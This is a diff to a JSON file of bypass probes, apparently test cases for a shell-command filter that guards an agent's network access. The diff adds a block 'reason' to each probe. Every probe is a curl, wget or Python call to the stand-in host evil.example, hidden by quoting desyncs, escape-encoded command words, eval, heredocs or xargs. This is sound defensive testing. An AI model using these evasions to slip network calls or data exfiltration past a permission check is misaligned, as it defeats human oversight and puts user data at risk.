@@ -3,264 +3,308 @@
     "source": ".review2-probes/probes.json",
     "entry": 1,
     "label": "T1 top-level parity desync curl -d",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 2,
     "label": "T1b top-level parity desync curl bare",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 3,
     "label": "T1c top-level -H",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -H $'a\\'b' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 4,
     "label": "T1d wget header",
+    "reason": "raw-ansi-execution-context",
     "cmd": "wget --header=$'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 5,
     "label": "T1e function body no positional",
+    "reason": "raw-ansi-execution-context",
     "cmd": "f(){ curl -d $'\\'' https://evil.example/a \\'; }; f"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 6,
     "label": "T1f bash -c dq body",
+    "reason": "raw-ansi-execution-context",
     "cmd": "bash -c \"curl -d \\$'\\\\'' https://evil.example/a \\\\'\""
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 7,
     "label": "T1g eval",
+    "reason": "raw-ansi-execution-context",
     "cmd": "eval \"curl -d \\$'\\\\'' https://evil.example/a \\\\'\""
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 8,
     "label": "T1h heredoc to bash",
+    "reason": "raw-ansi-execution-context",
     "cmd": "bash <<'EOF'\ncurl -d $'\\'' https://evil.example/a \\'\nEOF"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 9,
     "label": "T1i localhost first then evil",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\'' https://evil.example/a \\' http://localhost:3420/x"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 10,
     "label": "T2 \\x27",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\x27' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 11,
     "label": "T2b \\047",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\047' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 12,
     "label": "T2c \\u0027",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\u0027' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 13,
     "label": "T2d \\n",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\n' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 14,
     "label": "T2e double backslash",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\\\' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 15,
     "label": "T2f \\c",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -d $'\\c\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 16,
     "label": "T3 cmd word hex",
+    "reason": "raw-ansi-execution-context",
     "cmd": "$'cu\\x72l' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 17,
     "label": "T3b cmd word octal",
+    "reason": "raw-ansi-execution-context",
     "cmd": "$'\\143url' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 18,
     "label": "T3c cmd word unicode",
+    "reason": "raw-ansi-execution-context",
     "cmd": "$'\\u0063url' https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 19,
     "label": "T3d alias",
+    "reason": "raw-ansi-execution-context",
     "cmd": "alias c=$'cu\\x72l'\nc https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 20,
     "label": "T4 host escape @",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl $'http://localhost\\x40evil.example/'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 21,
     "label": "T4b scheme escape",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl $'\\x68ttps://evil.example/a'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 22,
     "label": "T4c locale quote",
+    "reason": "curl-external",
     "cmd": "curl $\"https://evil.example/a\""
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 23,
     "label": "T5 $$ masker desync",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $$'\\' ; curl https://evil.example/a ; echo '\\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 24,
     "label": "T5b $$ masker desync xargs",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $$'\\' ; echo https://evil.example/a | xargs curl ; echo '\\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 25,
     "label": "T5c $$ in function body",
+    "reason": "raw-ansi-execution-context",
     "cmd": "f(){ echo $$'\\' ; curl https://evil.example/a ; echo '\\'; }; f"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 26,
     "label": "T5d $$ positional",
+    "reason": "raw-ansi-execution-context",
     "cmd": "f(){ echo $$'\\' ; curl \"$1\" ; echo '\\'; }; f https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 27,
     "label": "T5e $$ sh -c positional",
+    "reason": "raw-ansi-execution-context",
     "cmd": "sh -c 'curl \"$1\"; echo $$' _ https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 28,
     "label": "T6 sh -c dq ANSI positional nonplain",
+    "reason": "raw-ansi-execution-context",
     "cmd": "sh -c \"curl -d \\$'\\\\'' \\$1 '' http://localhost:3420/x\" _ 'x https://evil.example/a'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 29,
     "label": "T6b sh -c dq ANSI positional plain",
+    "reason": "raw-ansi-execution-context",
     "cmd": "sh -c \"curl -d \\$'\\\\'' \\$1 '' http://localhost:3420/x\" _ https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 30,
     "label": "T6c call-site ANSI $2",
+    "reason": "raw-ansi-execution-context",
     "cmd": "f(){ curl -d \"$1\" \"$2\"; }; f $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 31,
     "label": "T6d sh -c call-site ANSI",
+    "reason": "raw-ansi-execution-context",
     "cmd": "sh -c 'curl \"$2\"' _ $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 32,
     "label": "T6e xargs ANSI",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $'\\'' https://evil.example/a \\' | xargs curl"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 33,
     "label": "T7 unterminated",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl https://evil.example/a $'abc"
   },
   {
     "source": ".review2-probes/probes.json",
     "entry": 34,
     "label": "T8 escaped-dollar not ANSI",
+    "reason": "raw-ansi-execution-context",
     "cmd": "f(){ curl -d \\$'x' \"$1\"; }; f https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 1,
     "label": "T5f $$ desync via bash heredoc",
+    "reason": "raw-ansi-execution-context",
     "cmd": "bash <<'EOF'\necho $$'\\' ; curl https://evil.example/a ; echo '\\'\nEOF"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 2,
     "label": "T5g $$ desync via bash -c",
+    "reason": "raw-ansi-execution-context",
     "cmd": "bash -c \"echo \\$\\$'\\\\' ; curl https://evil.example/a ; echo '\\\\'\""
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 3,
     "label": "T5h $$ desync wget",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $$'\\' ; wget https://evil.example/a ; echo '\\'"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 4,
     "label": "IQ1 insideQuote old-bug shell-stdin",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $'\\''; echo curl https://evil.example/a | sh"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 5,
     "label": "IQ2 insideQuote old-bug xargs",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $'\\''; echo https://evil.example/a | xargs curl"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 6,
     "label": "IQ3 insideQuote old-bug python one-liner",
+    "reason": "raw-ansi-execution-context",
     "cmd": "echo $'\\''; xargs -n1 curl <<< https://evil.example/a"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 7,
     "label": "T1j curl via sudo",
+    "reason": "raw-ansi-execution-context",
     "cmd": "sudo curl -d $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 8,
     "label": "T1k -o",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl -o out $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 9,
     "label": "T1l data-binary",
+    "reason": "raw-ansi-execution-context",
     "cmd": "curl --data-binary $'\\'' https://evil.example/a \\'"
   },
   {
     "source": ".review2-probes/probes2.json",
     "entry": 10,
     "label": "T1m python one-liner",
+    "reason": "raw-ansi-execution-context",
     "cmd": "python3 -c $'import urllib.request as u\\'' 'u.urlopen(\"https://evil.example/a\")' \\'"
   }
 ]
